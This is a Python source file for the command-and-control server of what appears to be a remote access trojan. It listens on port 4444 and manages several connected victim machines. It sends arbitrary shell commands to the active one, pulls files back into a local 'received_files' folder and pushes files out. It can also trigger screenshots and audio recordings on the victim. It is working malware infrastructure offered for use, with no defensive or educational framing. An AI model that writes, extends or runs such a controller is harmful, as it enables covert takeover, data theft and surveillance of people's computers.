import socket
import threading
import os
import sys
import time
import struct

# Color codes
GREEN = '\033[92m'
RESET = '\033[0m'

class RemoteServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.clients = {}
        self.active_client = None
        self.active_client_dir = ""
        self.output_dir = "received_files"
        
        # Create output directory if it doesn't exist
        os.makedirs(self.output_dir, exist_ok=True)
        
    def start(self):
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"[*] Server listening on {self.host}:{self.port}")
        
        while True:
            client_socket, client_address = self.server_socket.accept()
            print(f"[+] New connection from {client_address[0]}:{client_address[1]}")
            
            client_id = f"{client_address[0]}:{client_address[1]}"
            self.clients[client_id] = {
                'socket': client_socket,
                'address': client_address,
                'dir': ''
            }
            
            # Set as active client if it's the first one
            if self.active_client is None:
                self.active_client = client_id
                
            # Start client handler thread
            client_thread = threading.Thread(target=self.handle_client, args=(client_id,))
            client_thread.daemon = True
            client_thread.start()
            
    def handle_client(self, client_id):
        client = self.clients[client_id]
        client_socket = client['socket']
        file_transfer = None
        remaining_bytes = 0
        file_path = ""
        buffer = b""  # Buffer to accumulate partial data
        
        while True:
            try:
                # If we're in the middle of a file transfer
                if file_transfer:
                    data = client_socket.recv(min(4096, remaining_bytes))
                    if not data:
                        break
                    
                    # Write directly to server storage
                    file_transfer.write(data)
                    remaining_bytes -= len(data)
                    
                    if remaining_bytes <= 0:
                        file_transfer.close()
                        print(f"[+] File received and saved to server: {file_path}")
                        file_transfer = None
                else:
                    # Receive data and add to buffer
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    buffer += data
                    
                    # Process complete messages (ending with newline)
                    while b'\n' in buffer:
                        # Split at the first newline
                        line, buffer = buffer.split(b'\n', 1)
                        
                        try:
                            # Decode the line as UTF-8
                            line_str = line.decode('utf-8', errors='ignore')
                        except UnicodeDecodeError:
                            # Skip invalid lines
                            continue
                        
                        # Handle special messages
                        if line_str.startswith("CONNECTED:"):
                            # Extract directory part and clean it
                            dir_part = line_str.split(":", 1)[1]
                            # Remove any trailing "COMMAND_COMPLETE" or "DIR_CHANGED:" parts
                            dir_part = self.clean_directory_string(dir_part)
                            client['dir'] = dir_part
                            if client_id == self.active_client:
                                self.active_client_dir = client['dir']
                            print(f"[+] Client {client_id} connected. Current directory: {client['dir']}")
                        
                        elif line_str.startswith("DIR_CHANGED:"):
                            # Extract directory part and clean it
                            new_dir = line_str.split(":", 1)[1]
                            new_dir = self.clean_directory_string(new_dir)
                            client['dir'] = new_dir
                            if client_id == self.active_client:
                                self.active_client_dir = new_dir
                                print(f"[+] Client directory updated to: {new_dir}")
                        
                        elif line_str.startswith("MONITOR:"):
                            print(f"[MONITOR] {line_str.split(':', 1)[1]}")
                        
                        elif line_str.startswith("FILE:"):
                            parts = line_str.split(":", 2)
                            if len(parts) == 3:
                                filename = parts[1]
                                try:
                                    file_size = int(parts[2])
                                except ValueError:
                                    print(f"[-] Invalid file size: {parts[2]}")
                                    continue
                                
                                # Create directory structure in server storage
                                file_path = os.path.join(self.output_dir, filename)
                                os.makedirs(os.path.dirname(file_path), exist_ok=True)
                                
                                print(f"[+] Receiving file: {filename} ({file_size} bytes)")
                                
                                # Open file on server for writing
                                file_transfer = open(file_path, 'wb')
                                remaining_bytes = file_size
                                
                                # If there's additional data in the buffer
                                if buffer:
                                    bytes_to_write = min(len(buffer), remaining_bytes)
                                    file_transfer.write(buffer[:bytes_to_write])
                                    remaining_bytes -= bytes_to_write
                                    buffer = buffer[bytes_to_write:]
                        
                        elif line_str == "COMMAND_COMPLETE":
                            # Command execution completed
                            pass
                        
                        else:
                            # Regular output
                            if client_id == self.active_client:
                                print(line_str.rstrip())
            
            except Exception as e:
                print(f"[-] Error with client {client_id}: {e}")
                break
        
        # Clean up disconnected client
        print(f"[-] Client {client_id} disconnected")
        if client_id in self.clients:
            del self.clients[client_id]
        if self.active_client == client_id:
            self.active_client = None
            self.active_client_dir = ""
        client_socket.close()
    
    def clean_directory_string(self, dir_str):
        """Clean directory string by removing trailing command indicators"""
        # Remove trailing "COMMAND_COMPLETE"
        if dir_str.endswith("COMMAND_COMPLETE"):
            dir_str = dir_str[:-len("COMMAND_COMPLETE")]
        
        # Remove trailing "DIR_CHANGED:" if present
        if "DIR_CHANGED:" in dir_str:
            # Split at the first occurrence of "DIR_CHANGED:"
            dir_str = dir_str.split("DIR_CHANGED:")[0]
        
        return dir_str.strip()
    
    def send_command(self, command):
        if self.active_client is None:
            print("[-] No active client")
            return
        
        try:
            client_socket = self.clients[self.active_client]['socket']
            client_socket.send(command.encode('utf-8'))
        except Exception as e:
            print(f"[-] Error sending command: {e}")
    
    def list_clients(self):
        print("\nConnected clients:")
        for i, client_id in enumerate(self.clients.keys()):
            status = "ACTIVE" if client_id == self.active_client else ""
            print(f"{i+1}. {client_id} - {self.clients[client_id]['dir']} {status}")
        print()
    
    def switch_client(self, client_index):
        client_ids = list(self.clients.keys())
        if 0 <= client_index < len(client_ids):
            self.active_client = client_ids[client_index]
            self.active_client_dir = self.clients[self.active_client]['dir']
            print(f"[+] Switched to client: {self.active_client}")
        else:
            print("[-] Invalid client index")
    
    def pull_file(self, remote_path):
        """Pull a file from the client to the server"""
        if not self.active_client:
            print("[-] No active client")
            return
        
        print(f"[*] Requesting file: {remote_path}")
        self.send_command(f"pull {remote_path}")
        
        # The file will be received through the normal file transfer mechanism
        # and saved in the output directory
    
    def send_file(self, local_path, remote_path=None):
        """Send a file from the server to the client"""
        if not self.active_client:
            print("[-] No active client")
            return
        
        if not os.path.exists(local_path):
            print(f"[-] File not found: {local_path}")
            return
        
        # If remote path not specified, use just the filename from local path
        # This will save the file in the current directory on the client
        if not remote_path:
            remote_path = os.path.basename(local_path)
        
        print(f"[*] Sending file: {local_path} -> {remote_path}")
        
        # Get file size
        file_size = os.path.getsize(local_path)
        
        # Send the send command with remote path and size
        self.send_command(f"send {remote_path} {file_size}")
        
        # Send the file content
        try:
            with open(local_path, 'rb') as f:
                client_socket = self.clients[self.active_client]['socket']
                bytes_sent = 0
                while bytes_sent < file_size:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    client_socket.send(chunk)
                    bytes_sent += len(chunk)
            
            print(f"[+] File sent successfully to client: {remote_path}")
        except Exception as e:
            print(f"[-] Error sending file: {e}")
    
    def interactive_shell(self):
        print("\n[*] Starting interactive shell...")
        print("[*] Type 'help' for available commands\n")
        
        while True:
            try:
                if self.active_client:
                    prompt = f"{GREEN}[{self.active_client_dir}]{RESET}> "
                else:
                    prompt = f"{GREEN}[no client]{RESET}> "
                
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command == "/help":
                    print("\nAvailable commands:")
                    print("  list           - List connected clients")
                    print("  switch <num>   - Switch to client by number")
                    print("  screenshot     - Take screenshot from active client")
                    print("  record [sec]   - Record audio from active client")
                    print("  pull <path>    - Pull a file from client to server")
                    print("  send <lpath> [rpath] - Send a file from server to client")
                    print("  exit           - Exit the server\n")
                
                elif command == "list":
                    self.list_clients()
                
                elif command.startswith("switch "):
                    try:
                        client_index = int(command.split()[1]) - 1
                        self.switch_client(client_index)
                    except (IndexError, ValueError):
                        print("[-] Usage: switch <client number>")
                
                elif command == "screenshot":
                    self.send_command("screenshot")
                
                elif command.startswith("record "):
                    duration = command.split()[1] if len(command.split()) > 1 else "10"
                    self.send_command(f"record {duration}")
                
                elif command == "record":
                    self.send_command("record 10")
                
                elif command.startswith("pull "):
                    remote_path = command.split(' ', 1)[1]
                    self.pull_file(remote_path)
                
                elif command.startswith("send "):
                    parts = command.split(' ', 2)
                    if len(parts) >= 2:
                        local_path = parts[1]
                        remote_path = parts[2] if len(parts) > 2 else None
                        self.send_file(local_path, remote_path)
                    else:
                        print("[-] Usage: send <local_path> [remote_path]")
                
                elif command == "exit":
                    break
                
                else:
                    self.send_command(command)
            
            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                break
            except Exception as e:
                print(f"[-] Error: {e}")

def main():
    server = RemoteServer()
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=server.start)
    server_thread.daemon = True
    server_thread.start()
    
    # Wait for server to start
    time.sleep(1)
    
    # Start interactive shell
    server.interactive_shell()

if __name__ == "__main__":
    main()
